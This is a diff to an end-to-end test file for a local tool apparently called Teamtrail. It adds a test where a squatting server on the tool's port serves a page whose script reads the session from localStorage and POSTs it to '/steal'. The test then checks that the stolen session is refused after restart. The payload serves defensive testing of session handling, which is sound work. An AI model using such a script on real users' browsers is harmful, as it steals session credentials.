@@ -8,9 +8,9 @@ import os from 'node:os';
 import path from 'node:path';
 import { lookoutLinks, pairLink, sessionHeaders, shootThemes, signInWith } from './e2eHelpers.mjs';
 
-async function startLookout(cli, cwd, env) {
+async function startLookout(cli, cwd, env, port = '0') {
   // On every interface, so a "device" can come in by the network address.
-  const server = spawn(process.execPath, [cli, '--no-open', '--port', '0', '--host', '0.0.0.0'], { cwd, env });
+  const server = spawn(process.execPath, [cli, '--no-open', '--port', port, '--host', '0.0.0.0'], { cwd, env });
   const links = await new Promise((resolve, reject) => {
     let out = '';
     server.stdout.on('data', (c) => {
@@ -53,7 +53,7 @@ async function anotherPortSeesNothing(page, lookoutUrl) {
   await new Promise((r) => other.listen(0, '127.0.0.1', r));
   const at = `http://localhost:${other.address().port}/`;
   try {
-    const session = await page.evaluate(() => localStorage.getItem('teamtrail.session'));
+    const session = await page.evaluate(() => JSON.parse(localStorage.getItem('teamtrail.session') ?? '{}').secret);
     await page.goto(at);
     const read = await page.evaluate(async (api) => {
       const reached = await fetch(`${api}__teamtrail/list`, { headers: { 'X-Teamtrail-Session': 'x' } }).then(
@@ -73,6 +73,53 @@ async function anotherPortSeesNothing(page, lookoutUrl) {
   } finally {
     other.close();
   }
+}
+
+/**
+ * The Lookout stops with the tab open, and another server takes its port (an agent's): the tab sends it no session,
+ * only asks it to prove itself, and says Teamtrail isn't running. Whatever that server's own page then reads from
+ * the tab's storage is dead once the Lookout starts again. Returns the restarted Lookout.
+ */
+async function squatterGetsNothing({ cli, top, env, server, url, page, shots }) {
+  const secret = (await sessionHeaders(page))['X-Teamtrail-Session'];
+  const port = new URL(url).port;
+  await new Promise((r) => (server.once('exit', r), server.kill('SIGTERM')));
+  const heard = [];
+  let stolen;
+  const squatter = http.createServer((req, res) => {
+    let body = '';
+    req.on('data', (c) => (body += c));
+    req.on('end', () => {
+      heard.push(`${req.method} ${req.url} ${JSON.stringify(req.headers)} ${body}`);
+      if (req.url === '/steal') stolen = JSON.parse(body || '{}');
+      if (req.url.includes('/prove')) return res.end(JSON.stringify({ proof: 'f'.repeat(64) }));
+      const page = !req.url.startsWith('/__teamtrail');
+      res.setHeader('Content-Type', page ? 'text/html' : 'application/json');
+      res.end(
+        page
+          ? `<!doctype html><script>fetch('/steal',{method:'POST',body:localStorage.getItem('teamtrail.session')})</script>`
+          : '{}',
+      );
+    });
+  });
+  await new Promise((r) => squatter.listen(Number(port), r));
+  await page.getByText('isn’t running here').waitFor({ timeout: 30_000 });
+  await shootThemes(page, shots, '38-sign-in-not-running');
+  const leaked = heard.some((h) => h.includes(secret));
+  // a reload on the squatter's port runs its page in the Lookout's origin: it reads the storage
+  await page.reload();
+  const until = Date.now() + 10_000;
+  while (!stolen && Date.now() < until) await new Promise((r) => setTimeout(r, 100));
+  await new Promise((r) => (squatter.closeAllConnections(), squatter.close(r)));
+  const restarted = await startLookout(cli, top, env, port);
+  const replay = await fetch(`${url}__teamtrail/list`, {
+    headers: { 'X-Teamtrail-Session': stolen?.secret ?? secret },
+  });
+  await page.goto(url);
+  await page.getByRole('heading', { name: 'Pair this browser' }).waitFor({ timeout: 15_000 });
+  const ok = !leaked && !!stolen && replay.status === 401;
+  const said = `a server on the stopped Lookout's port got ${leaked ? 'THE SESSION' : 'no session'} from the open tab (shown: isn't running here); its page read ${stolen ? 'the stored session' : 'NOTHING (unexpected)'}, refused (${replay.status}) once the Lookout restarted`;
+  return { ok, said, server: restarted.server };
 }
 
 const getStarted = async (page) => {
@@ -113,7 +160,9 @@ export async function verifySignIn({ browser, cli, log, shots }) {
   const top = fs.mkdtempSync(path.join(os.tmpdir(), 'teamtrail-sign-in-e2e-'));
   fs.mkdirSync(path.join(top, '.teamtrail'));
   const env = { ...process.env, TEAMTRAIL_CONFIG_DIR: path.join(top, 'config') };
-  const { server, url, pair } = await startLookout(cli, top, env);
+  const started = await startLookout(cli, top, env);
+  const { url, pair } = started;
+  let server = started.server;
   const pages = [];
   const newPage = async (viewport = { width: 1440, height: 900 }) => {
     const p = await browser.newPage({ viewport });
@@ -165,9 +214,11 @@ export async function verifySignIn({ browser, cli, log, shots }) {
     await other.getByRole('button', { name: /^Revoke .+/ }).click();
     await b.getByRole('heading', { name: 'Pair this browser' }).waitFor({ timeout: 15_000 });
 
-    const ok = closed && codeGone && listed === 2 && device.ok && otherPort.ok;
+    const squat = await squatterGetsNothing({ cli, top, env, server, url, page: a, shots });
+    server = squat.server;
+    const ok = closed && codeGone && listed === 2 && device.ok && otherPort.ok && squat.ok;
     log(
-      `sign-in ${ok ? 'ok' : 'WRONG'}: API without a session ${bare.map((r) => r.status).join('/')}; link used once${codeGone ? ', code gone from the address bar' : ', code LEFT in the URL'}; teamtrail pair signed in a second browser; ${listed} paired browsers listed; ${device.said}; the revoked browser dropped to Pair this browser; ${otherPort.said}`,
+      `sign-in ${ok ? 'ok' : 'WRONG'}: API without a session ${bare.map((r) => r.status).join('/')}; link used once${codeGone ? ', code gone from the address bar' : ', code LEFT in the URL'}; teamtrail pair signed in a second browser; ${listed} paired browsers listed; ${device.said}; the revoked browser dropped to Pair this browser; ${otherPort.said}; ${squat.said}`,
     );
     return ok;
   } catch (e) {
